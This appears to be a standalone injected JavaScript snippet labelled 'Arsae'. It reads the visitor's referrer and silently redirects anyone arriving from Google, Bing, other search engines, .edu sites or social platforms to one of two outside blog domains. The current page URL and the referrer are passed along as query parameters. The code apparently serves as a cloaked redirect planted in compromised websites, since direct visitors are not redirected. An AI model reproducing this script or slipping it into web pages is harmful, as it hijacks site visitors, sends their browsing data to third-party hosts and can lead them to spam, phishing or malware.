///// Arsae /////
var arsT1Bing = 'https://blog.unimal.edu.pl';
var arsT1Google = 'http://blog.ondasee.com';

if(['google.'].some(s => document.referrer.toLowerCase().includes(s))){
	window.location.href = arsT1Google + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
}else if(['.edu.', 'google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
}
